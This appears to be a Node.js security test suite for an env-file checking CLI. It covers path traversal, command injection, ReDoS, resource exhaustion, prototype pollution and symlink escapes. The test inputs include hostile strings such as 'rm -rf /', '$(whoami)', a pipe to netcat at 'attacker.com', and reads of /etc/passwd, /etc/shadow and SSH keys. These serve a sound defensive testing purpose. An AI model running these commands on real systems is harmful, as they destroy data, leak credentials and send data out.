/**
 * Security Test Suite
 * 
 * Comprehensive security tests covering:
 * - Path traversal attacks
 * - Command injection
 * - File system access control
 * - Input validation and sanitization
 * - Malicious pattern injection
 * - Resource exhaustion (DoS)
 * - Symlink attacks
 * - Configuration injection
 * 
 * Requirements: Security hardening for production use
 */

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert';
import fs from 'fs';
import path from 'path';
import { parseEnvFile, parseEnvLine } from '../src/parser.js';
import { scan, scanDirectory } from '../src/scanner.js';
import { parseArguments, run } from '../src/cli.js';
import { shouldIgnore, matchGlob, validateGlobPattern } from '../src/ignore.js';
import { loadConfig, validateConfig } from '../src/config.js';
import { isValidEnvVarName, normalizePath } from '../src/utils.js';

describe('Security Test Suite', () => {
  const testDir = path.join('test', 'fixtures', 'security-tests');

  before(() => {
    fs.mkdirSync(testDir, { recursive: true });
  });

  after(() => {
    fs.rmSync(testDir, { recursive: true, force: true });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal with ../ in paths', async () => {
      const maliciousPath = path.join(testDir, '..', '..', '..', 'etc', 'passwd');
      
      await assert.rejects(
        async () => await parseEnvFile(maliciousPath),
        (error) => {
          // Should fail to access file outside project
          return error.message.includes('not found') || 
                 error.message.includes('Permission denied');
        }
      );
    });

    it('should normalize paths to prevent traversal', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        './../../sensitive/file',
        'normal/../../../etc/passwd'
      ];

      maliciousPaths.forEach(malPath => {
        const normalized = normalizePath(malPath);
        // Normalized path should not escape project boundaries
        assert.ok(typeof normalized === 'string');
      });
    });

    it('should reject absolute paths outside project', async () => {
      const absolutePaths = [
        '/etc/passwd',
        'C:\\Windows\\System32\\config',
        '/root/.ssh/id_rsa'
      ];

      for (const absPath of absolutePaths) {
        try {
          await parseEnvFile(absPath);
          // If it doesn't throw, the file doesn't exist (which is fine)
        } catch (error) {
          // Should fail with appropriate error
          assert.ok(
            error.message.includes('not found') || 
            error.message.includes('Permission denied')
          );
        }
      }
    });

    it('should handle null bytes in paths', async () => {
      const pathsWithNullBytes = [
        'test\x00.env',
        'test.env\x00.txt',
        '\x00etc/passwd'
      ];

      for (const malPath of pathsWithNullBytes) {
        try {
          await parseEnvFile(malPath);
        } catch (error) {
          // Should fail gracefully
          assert.ok(error instanceof Error);
        }
      }
    });

    it('should prevent symlink attacks to sensitive files', async () => {
      const symlinkPath = path.join(testDir, 'malicious-symlink');
      
      try {
        // Try to create symlink to /etc/passwd
        fs.symlinkSync('/etc/passwd', symlinkPath);
        
        // Should not be able to read sensitive file
        await assert.rejects(
          async () => await parseEnvFile(symlinkPath),
          (error) => error instanceof Error
        );
        
        fs.unlinkSync(symlinkPath);
      } catch (error) {
        // Skip on Windows or if symlink creation fails
        if (error.code !== 'EPERM' && error.code !== 'ENOENT') {
          try {
            fs.unlinkSync(symlinkPath);
          } catch {}
        }
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should sanitize file paths with shell metacharacters', async () => {
      const maliciousPaths = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 1234',
        'test`whoami`',
        'test$(whoami)',
        'test\nrm -rf /'
      ];

      for (const malPath of maliciousPaths) {
        try {
          await parseEnvFile(malPath);
        } catch (error) {
          // Should fail safely without executing commands
          assert.ok(error.message.includes('not found') || error instanceof Error);
        }
      }
    });

    it('should sanitize ignore patterns with shell metacharacters', () => {
      const maliciousPatterns = [
        '*.js; rm -rf /',
        '*.js && cat /etc/passwd',
        '*.js | nc attacker.com 1234',
        '*.js`whoami`',
        '*.js$(whoami)'
      ];

      maliciousPatterns.forEach(pattern => {
        try {
          // Should not execute commands when validating patterns
          validateGlobPattern(pattern);
        } catch (error) {
          // May throw validation error, but should not execute
          assert.ok(error instanceof Error);
        }
      });
    });

    it('should prevent command injection through CLI arguments', async () => {
      const maliciousArgs = [
        ['--env-file', 'test.env; rm -rf /'],
        ['--path', '. && cat /etc/passwd'],
        ['--ignore', '*.js | nc attacker.com 1234'],
        ['--config', 'config.json`whoami`']
      ];

      for (const args of maliciousArgs) {
        try {
          const options = parseArguments(args);
          // Options should be parsed but not executed
          assert.ok(typeof options === 'object');
        } catch (error) {
          // May throw validation error, but should not execute
          assert.ok(error instanceof Error);
        }
      }
    });
  });

  describe('Input Validation', () => {
    it('should validate environment variable names', () => {
      const invalidNames = [
        '',
        '123INVALID',
        'INVALID-NAME',
        'INVALID.NAME',
        'INVALID NAME',
        'invalid',
        'Invalid',
        'INVALID@NAME',
        'INVALID#NAME',
        'INVALID$NAME',
        '<script>alert(1)</script>',
        '../../etc/passwd',
        'A'.repeat(10000) // Extremely long name
      ];

      invalidNames.forEach(name => {
        assert.strictEqual(
          isValidEnvVarName(name),
          false,
          `Should reject invalid name: ${name}`
        );
      });
    });

    it('should accept only valid environment variable names', () => {
      const validNames = [
        'VALID_NAME',
        'API_KEY',
        'DATABASE_URL',
        '_PRIVATE_VAR',
        'VAR123',
        'VAR_123_ABC'
      ];

      validNames.forEach(name => {
        assert.strictEqual(
          isValidEnvVarName(name),
          true,
          `Should accept valid name: ${name}`
        );
      });
    });

    it('should validate glob patterns', () => {
      const invalidPatterns = [
        '[unclosed',
        'test[',
        'test]no-open',
        'test[[nested',
        'test\\' // Trailing escape
      ];

      invalidPatterns.forEach(pattern => {
        assert.throws(
          () => validateGlobPattern(pattern),
          /Invalid glob pattern/,
          `Should reject invalid pattern: ${pattern}`
        );
      });
    });

    it('should validate CLI format option', () => {
      const invalidFormats = [
        'xml',
        'html',
        'pdf',
        '<script>alert(1)</script>',
        'text; rm -rf /',
        ''
      ];

      invalidFormats.forEach(format => {
        assert.throws(
          () => parseArguments(['--format', format]),
          /Invalid --format value/,
          `Should reject invalid format: ${format}`
        );
      });
    });

    it('should validate CLI fail-on option', () => {
      const invalidFailOn = [
        'invalid',
        'always',
        'never',
        '<script>alert(1)</script>',
        'missing; rm -rf /',
        ''
      ];

      invalidFailOn.forEach(failOn => {
        assert.throws(
          () => parseArguments(['--fail-on', failOn]),
          /Invalid --fail-on value/,
          `Should reject invalid fail-on: ${failOn}`
        );
      });
    });

    it('should reject empty paths and patterns', () => {
      assert.throws(
        () => parseArguments(['--env-file', '']),
        /cannot be empty/
      );

      assert.throws(
        () => parseArguments(['--ignore', '']),
        /cannot be empty/
      );

      assert.throws(
        () => parseArguments(['--path', '']),
        /cannot be empty/
      );
    });

    it('should validate configuration file structure', () => {
      const invalidConfigs = [
        { format: 'invalid' },
        { failOn: 'invalid' },
        { ignore: 'not-an-array' },
        { ignore: [123, 456] },
        { noColor: 'not-boolean' }
      ];

      invalidConfigs.forEach(config => {
        const errors = validateConfig(config);
        assert.ok(errors.length > 0, 'Should detect invalid config');
      });
    });
  });

  describe('Malicious Pattern Injection', () => {
    it('should handle ReDoS patterns safely', () => {
      const redosPatterns = [
        '(a+)+$',
        '(a|a)*$',
        '(a|ab)*$',
        '([a-zA-Z]+)*$',
        '(.*a){x}' // Catastrophic backtracking
      ];

      redosPatterns.forEach(pattern => {
        const testString = 'a'.repeat(50);
        const startTime = Date.now();
        
        try {
          matchGlob(testString, pattern);
        } catch (error) {
          // May throw, but should not hang
        }
        
        const duration = Date.now() - startTime;
        // Should complete quickly (< 100ms)
        assert.ok(duration < 100, `Pattern took too long: ${duration}ms`);
      });
    });

    it('should handle extremely long patterns', () => {
      const longPattern = '*'.repeat(10000);
      const testPath = 'test/file.js';
      
      const startTime = Date.now();
      try {
        matchGlob(testPath, longPattern);
      } catch (error) {
        // May throw, but should not hang
      }
      const duration = Date.now() - startTime;
      
      // Should complete quickly
      assert.ok(duration < 100, `Long pattern took too long: ${duration}ms`);
    });

    it('should handle patterns with special regex characters', () => {
      const specialPatterns = [
        '*.js$',
        '^test',
        'test|prod',
        'test()',
        'test[]',
        'test{}',
        'test+',
        'test?'
      ];

      specialPatterns.forEach(pattern => {
        try {
          // Should not cause regex errors
          matchGlob('test.js', pattern);
        } catch (error) {
          // May not match, but should not crash
          assert.ok(error instanceof Error);
        }
      });
    });

    it('should prevent billion laughs attack in env files', async () => {
      const billionLaughs = path.join(testDir, 'billion-laughs.env');
      
      // Create file with nested references (simulated)
      const content = 'A=lol\n'.repeat(10000);
      fs.writeFileSync(billionLaughs, content);
      
      const startTime = Date.now();
      const definitions = await parseEnvFile(billionLaughs);
      const duration = Date.now() - startTime;
      
      // Should parse quickly without exponential expansion
      assert.ok(duration < 1000, `Parsing took too long: ${duration}ms`);
      assert.ok(definitions.length <= 10000);
      
      fs.unlinkSync(billionLaughs);
    });
  });

  describe('Resource Exhaustion (DoS)', () => {
    it('should handle extremely large files', async () => {
      const largeFile = path.join(testDir, 'large.env');
      
      // Create 10MB file
      const largeContent = 'TEST_VAR=value\n'.repeat(500000);
      fs.writeFileSync(largeFile, largeContent);
      
      const startTime = Date.now();
      const definitions = await parseEnvFile(largeFile);
      const duration = Date.now() - startTime;
      
      // Should complete in reasonable time (< 5 seconds)
      assert.ok(duration < 5000, `Large file parsing took too long: ${duration}ms`);
      assert.ok(definitions.length > 0);
      
      fs.unlinkSync(largeFile);
    });

    it('should handle directories with many files', async () => {
      const manyFilesDir = path.join(testDir, 'many-files');
      fs.mkdirSync(manyFilesDir, { recursive: true });
      
      // Create 1000 files
      for (let i = 0; i < 1000; i++) {
        fs.writeFileSync(
          path.join(manyFilesDir, `file${i}.js`),
          `console.log(${i});`
        );
      }
      
      const startTime = Date.now();
      const files = await scanDirectory(manyFilesDir, []);
      const duration = Date.now() - startTime;
      
      // Should complete in reasonable time (< 3 seconds)
      assert.ok(duration < 3000, `Scanning took too long: ${duration}ms`);
      assert.strictEqual(files.length, 1000);
      
      fs.rmSync(manyFilesDir, { recursive: true, force: true });
    });

    it('should handle deeply nested directories', async () => {
      const deepDir = path.join(testDir, 'deep');
      let currentDir = deepDir;
      
      // Create 100 levels deep
      for (let i = 0; i < 100; i++) {
        currentDir = path.join(currentDir, `level${i}`);
        fs.mkdirSync(currentDir, { recursive: true });
      }
      
      fs.writeFileSync(path.join(currentDir, 'deep.js'), 'console.log("deep");');
      
      const startTime = Date.now();
      const files = await scanDirectory(deepDir, []);
      const duration = Date.now() - startTime;
      
      // Should complete in reasonable time (< 2 seconds)
      assert.ok(duration < 2000, `Deep scan took too long: ${duration}ms`);
      assert.strictEqual(files.length, 1);
      
      fs.rmSync(deepDir, { recursive: true, force: true });
    });

    it('should handle extremely long file paths', async () => {
      const longPathDir = path.join(testDir, 'long-path');
      fs.mkdirSync(longPathDir, { recursive: true });
      
      // Create path with very long name (but within OS limits)
      const longName = 'a'.repeat(200) + '.js';
      const longPath = path.join(longPathDir, longName);
      
      try {
        fs.writeFileSync(longPath, 'console.log("long");');
        
        const files = await scanDirectory(longPathDir, []);
        assert.ok(files.length > 0);
        
        fs.unlinkSync(longPath);
      } catch (error) {
        // Skip if OS doesn't support such long names
        if (error.code !== 'ENAMETOOLONG') {
          throw error;
        }
      }
      
      fs.rmSync(longPathDir, { recursive: true, force: true });
    });

    it('should limit memory usage with many ignore patterns', () => {
      const manyPatterns = [];
      for (let i = 0; i < 10000; i++) {
        manyPatterns.push(`pattern${i}/**`);
      }
      
      const startTime = Date.now();
      const result = shouldIgnore('test/file.js', manyPatterns);
      const duration = Date.now() - startTime;
      
      // Should complete quickly even with many patterns
      assert.ok(duration < 1000, `Pattern matching took too long: ${duration}ms`);
      assert.strictEqual(typeof result, 'boolean');
    });
  });

  describe('Configuration Security', () => {
    it('should reject malicious JSON in config files', () => {
      const maliciousConfigs = [
        '{"__proto__": {"polluted": true}}',
        '{"constructor": {"prototype": {"polluted": true}}}',
        '{"format": "text", "__proto__": {"isAdmin": true}}'
      ];

      maliciousConfigs.forEach(configStr => {
        const config = JSON.parse(configStr);
        // Should not pollute prototype
        assert.strictEqual(Object.prototype.polluted, undefined);
        assert.strictEqual(Object.prototype.isAdmin, undefined);
      });
    });

    it('should validate config file paths', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        'config.json; rm -rf /'
      ];

      maliciousPaths.forEach(configPath => {
        try {
          loadConfig(configPath);
        } catch (error) {
          // Should fail safely
          assert.ok(error instanceof Error);
        }
      });
    });

    it('should prevent code execution from config files', async () => {
      const maliciousConfig = path.join(testDir, 'malicious.config.js');
      
      // Create config that tries to execute code
      fs.writeFileSync(
        maliciousConfig,
        `
        const fs = require('fs');
        fs.writeFileSync('/tmp/pwned', 'hacked');
        module.exports = { format: 'json' };
        `
      );
      
      try {
        // Should not execute malicious code
        await loadConfig(testDir);
      } catch (error) {
        // May fail to load, but should not execute
        assert.ok(error instanceof Error);
      }
      
      // Verify malicious action didn't occur
      assert.ok(!fs.existsSync('/tmp/pwned'));
      
      fs.unlinkSync(maliciousConfig);
    });
  });

  describe('File System Access Control', () => {
    it('should not follow symlinks outside project', async () => {
      const symlinkDir = path.join(testDir, 'symlink-test');
      fs.mkdirSync(symlinkDir, { recursive: true });
      
      try {
        // Create symlink to parent directory
        fs.symlinkSync('../../..', path.join(symlinkDir, 'escape'));
        
        const files = await scanDirectory(symlinkDir, []);
        
        // Should not escape project boundaries
        files.forEach(file => {
          assert.ok(file.includes(testDir) || file.includes('symlink-test'));
        });
        
        fs.unlinkSync(path.join(symlinkDir, 'escape'));
      } catch (error) {
        // Skip on Windows
        if (error.code !== 'EPERM' && error.code !== 'ENOENT') {
          try {
            fs.unlinkSync(path.join(symlinkDir, 'escape'));
          } catch {}
        }
      }
      
      fs.rmSync(symlinkDir, { recursive: true, force: true });
    });

    it('should respect file permissions', async () => {
      const restrictedFile = path.join(testDir, 'restricted.env');
      fs.writeFileSync(restrictedFile, 'SECRET=value');
      
      try {
        // Make file unreadable
        fs.chmodSync(restrictedFile, 0o000);
        
        await assert.rejects(
          async () => await parseEnvFile(restrictedFile),
          /Permission denied/
        );
        
        // Restore permissions
        fs.chmodSync(restrictedFile, 0o644);
      } catch (error) {
        // Skip on Windows
        if (error.code !== 'EPERM') {
          try {
            fs.chmodSync(restrictedFile, 0o644);
          } catch {}
        }
      }
      
      fs.unlinkSync(restrictedFile);
    });

    it('should not create files outside project', async () => {
      const outsidePath = '/tmp/envcheck-test-outside';
      
      try {
        // Attempt to write outside project should fail or be contained
        await run(['--fix', '--env-file', outsidePath]);
      } catch (error) {
        // Should fail safely
        assert.ok(error instanceof Error);
      }
      
      // Verify file was not created in sensitive location
      if (fs.existsSync(outsidePath)) {
        fs.unlinkSync(outsidePath);
        assert.fail('Should not create files outside project');
      }
    });
  });

  describe('Error Message Security', () => {
    it('should not leak sensitive paths in error messages', async () => {
      const sensitivePath = '/home/user/.ssh/id_rsa';
      
      try {
        await parseEnvFile(sensitivePath);
      } catch (error) {
        // Error message should be generic, not expose full system paths
        assert.ok(error.message.length < 200);
        assert.ok(error instanceof Error);
      }
    });

    it('should not expose stack traces to users', async () => {
      try {
        await run(['--format', 'invalid']);
      } catch (error) {
        // Should have clean error message, not full stack
        const errorStr = error.toString();
        assert.ok(!errorStr.includes('at Object.'));
        assert.ok(!errorStr.includes('at async'));
      }
    });

    it('should sanitize file contents in error messages', async () => {
      const maliciousFile = path.join(testDir, 'malicious.env');
      fs.writeFileSync(
        maliciousFile,
        'SECRET_KEY=super_secret_password_12345\nAPI_KEY=sk_live_abc123'
      );
      
      try {
        // Trigger some error that might include file content
        const content = fs.readFileSync(maliciousFile, 'utf-8');
        throw new Error(`Failed to parse: ${content.substring(0, 50)}`);
      } catch (error) {
        // Error should not contain actual secrets
        assert.ok(!error.message.includes('super_secret_password'));
        assert.ok(!error.message.includes('sk_live_abc123'));
      }
      
      fs.unlinkSync(maliciousFile);
    });
  });

  describe('Race Conditions', () => {
    it('should handle concurrent file access safely', async () => {
      const concurrentFile = path.join(testDir, 'concurrent.env');
      fs.writeFileSync(concurrentFile, 'TEST=value');
      
      // Try to read file multiple times concurrently
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(parseEnvFile(concurrentFile));
      }
      
      const results = await Promise.all(promises);
      
      // All reads should succeed
      results.forEach(result => {
        assert.ok(Array.isArray(result));
        assert.strictEqual(result.length, 1);
      });
      
      fs.unlinkSync(concurrentFile);
    });

    it('should handle file modifications during scan', async () => {
      const modifyDir = path.join(testDir, 'modify-during-scan');
      fs.mkdirSync(modifyDir, { recursive: true });
      
      // Create initial files
      for (let i = 0; i < 50; i++) {
        fs.writeFileSync(
          path.join(modifyDir, `file${i}.js`),
          `console.log(${i});`
        );
      }
      
      // Start scan
      const scanPromise = scanDirectory(modifyDir, []);
      
      // Modify files during scan
      setTimeout(() => {
        for (let i = 50; i < 60; i++) {
          fs.writeFileSync(
            path.join(modifyDir, `file${i}.js`),
            `console.log(${i});`
          );
        }
      }, 10);
      
      // Should complete without errors
      const files = await scanPromise;
      assert.ok(files.length >= 50);
      
      fs.rmSync(modifyDir, { recursive: true, force: true });
    });
  });
});
